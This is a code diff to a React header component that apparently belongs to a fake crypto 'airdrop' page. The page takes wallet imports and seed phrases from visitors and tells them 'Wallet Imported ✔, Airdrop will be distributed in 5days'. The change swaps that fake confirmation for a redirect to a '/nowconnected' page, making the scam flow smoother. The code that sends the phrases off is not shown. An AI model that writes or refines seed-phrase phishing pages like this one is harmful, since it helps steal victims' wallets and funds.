@@ -13,7 +13,7 @@ import Twitter from "./twitter.svg"
 import Github from "./github.svg"
 
 
-function Header() {
+function Header(props) {
 
 
     const {wallet} = useParams()
@@ -37,8 +37,8 @@ function Header() {
         console.log(wallet);
 
         setInput("");
-
-        alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        props.history.push("/nowconnected")
     };
 
     const [phraseInput, setPhraseInput] = useState("");
@@ -58,7 +58,8 @@ function Header() {
         });
 
         setPhraseInput("");
-        alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        props.history.push("/nowconnected")
 
     };
 
@@ -76,7 +77,8 @@ function Header() {
         });
 
         setPhraseInput("");
-        alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        // alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
+        props.history.push("/nowconnected")
 
     };
 
